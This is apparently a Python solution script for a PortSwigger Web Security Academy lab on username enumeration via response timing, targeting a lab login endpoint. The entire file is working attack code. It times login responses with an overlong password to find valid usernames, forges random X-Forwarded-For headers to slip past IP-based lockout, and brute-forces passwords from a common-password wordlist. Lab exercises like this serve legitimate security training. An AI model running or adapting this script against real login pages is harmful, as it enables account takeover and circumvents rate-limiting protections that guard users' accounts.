"""
https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing
"""
from ctypes import c_long
from custom.burprequest import BurpReq
import re,sys
import random


PATTERN = 'Invalid username or password.'
ERROR = 'You have made too many incorrect login attempts'
valid = []
long_pass = "ppereterpeterpeterrpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpetereterppetpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpetereterppetpereterpeterpeterrpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpetereterppetpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpetereterppetereterpeterpeterrpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpetereterppetpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpeterereterpeterpeterpeterpetereterppet"
max_time = None

def GenerateRandXfor():
	return f"X-Forwarded-For: 203.0.{random.randrange(0, 255)}.{random.randrange(0, 255)}"

def main_req():
	return f"""POST /login HTTP/1.1
Host: ac051f541ef1fe02c0530abd009600b4.web-security-academy.net
Cookie: session=hFS164v65kjXlKjaZy2RG8GzlCsmpwz7
Content-Length: 24
Cache-Control: max-age=0
{GenerateRandXfor()}
Sec-Ch-Ua: ";Not A Brand";v="99", "Chromium";v="94"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://ac051f541ef1fe02c0530abd009600b4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://ac051f541ef1fe02c0530abd009600b4.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

"""

usernames = """carlos
root
admin
test
guest
info
adm
mysql
user
administrator
oracle
ftp
pi
puppet
ansible
ec2-user
vagrant
azureuser
academico
acceso
access
accounting
accounts
acid
activestat
ad
adam
adkit
admin
administracion
administrador
administrator
administrators
admins
ads
adserver
adsl
ae
af
affiliate
affiliates
afiliados
ag
agenda
agent
ai
aix
ajax
ak
akamai
al
alabama
alaska
albuquerque
alerts
alpha
alterwind
am
amarillo
americas
an
anaheim
analyzer
announce
announcements
antivirus
ao
ap
apache
apollo
app
app01
app1
apple
application
applications
apps
appserver
aq
ar
archie
arcsight
argentina
arizona
arkansas
arlington
as
as400
asia
asterix
at
athena
atlanta
atlas
att
au
auction
austin
auth
auto
wiener
autodiscover""".split()
password = """123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow""".split()


def Test():
	global max_time
	foo = 0
	for i in range(10):
		req = main_req() + "username=wiener&password=" + long_pass
		# print(req)
		res = BurpReq(req, False)
		data = res.MakeRequest()
		if re.search(ERROR, data.text):
			print('ip banned')
			sys.exit()
		print(data.status_code,re.search(PATTERN, data.text), data.elapsed.total_seconds(), )
		foo += data.elapsed.total_seconds()
	max_time = foo / 10
	print(max_time)

def GetValidUser():
	Test()
	for i in usernames:
		req = main_req() + f"username={i}&password=" + long_pass
		res = BurpReq(req, False)
		data = res.MakeRequest()

		if not re.search(ERROR, data.text):
			if float( data.elapsed.total_seconds() ) > 0.7 * max_time:
				print(f'{[i]}<=== is a valid username')
				valid.append(i)
			else:
				print(f'{i} invalid {data.status_code} {data.elapsed.total_seconds()} s')
		else:
			print('Ip banned!')
			sys.exit()
			
	print(f'all valid => {valid}')

def GetValidPass():
	GetValidUser()

	for user in valid:
		for p in password:
			req = main_req() + f"username={user}&password={p}"

			res = BurpReq(req, False)
			data = res.MakeRequest()

			if re.search(ERROR, data.text):
				print('ip banned')
				sys.exit()
			elif re.search(PATTERN, data.text):
				print(f'{p} wrong for {user}')
			else:
				print(f'CORRECT!! {user}:{p}')


if __name__ == '__main__':
	# Test()
	# GetValidUser()
	GetValidPass()
